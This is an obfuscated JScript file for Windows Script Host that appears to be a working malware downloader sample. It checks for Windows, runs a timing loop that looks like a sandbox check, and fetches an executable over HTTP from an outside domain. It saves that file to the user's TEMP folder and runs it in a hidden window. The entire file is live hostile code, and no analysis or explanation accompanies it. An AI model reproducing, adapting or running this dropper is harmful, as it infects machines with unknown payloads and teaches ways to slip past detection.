var DT = false;
var X = "CreateObject";
var Md = function nS() {return WScript[X]("WScript.Shell");}(), Ig = 11;
var jS = "MSXML2.XMLHTTP";
var B0 = 2123213;
var B = 0;
function Mv(x){Md["Run"](x, B, B);};
function R(){return "" + jS;};
function GB(v, xd){B = B * 1; return v - xd;};
function Z(){return X;};
/*@cc_on
  @if (@_win32 || @_win64)
    DT = true;
  @end
@*/
if (DT)
{
var GN = "";
function bp(){return 22;};
var tf = 0; var Vf = 0;
function Nc()
{
var DP = new this["Date"]();
var p = DP["getUTCMilliseconds"]();
WScript["Sleep"](bp());
var DP = new this["Date"]();
var S = DP["getUTCMilliseconds"]();
WScript["Sleep"](bp());
var DP = new this["Date"]();
var R0 = DP["getUTCMilliseconds"]();
var tf = "bG";
tf = GB(S, p);
var Vf = "b0";
Vf = GB(R0, S);
GN = "open";
return GB(tf, Vf);
}
var mH = false;
var G = false;
for (var uV = B; uV < bp() * 1; uV++){if (Nc() != B){
mH = true; 
Vf = "31" + 11 * tf + Vf; 
G = true; 
break;
}}
function mo() {return ((mH == true) && (mH == G)) ? 1 : B;};
if (mH && mo() && G){
function b() {return Md["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "n1M919BR6mlc.exe";};
 k = R();
 Ob = WScript[X](k);
 var P = 1;
 while (P){
try {
Ob[GN]("GET", "http://pasticceriabonci.com/n4usj", false);
Ob["send"]();
iD = "Sleep";
for (;;){WScript[iD](bp() * 11); if (Ob["readystate"] >= 2 * 2) break;};
P = B;
} catch(Ui){};
}
function CX(Y) {var j = (1, 2, 3, 4, 5, Y); return j;};
WE = WScript[Z()]("ADODB.Stream");
k = WE;
k[GN]();
k["type"] = CX(1);
k["write"](Ob["ResponseBody"]);
WE["position"] = CX(B);
k["Save" + "ToFile"](b(), 2);
WE["c"+"lose"]();
A = b();
Mv(A);
}
}

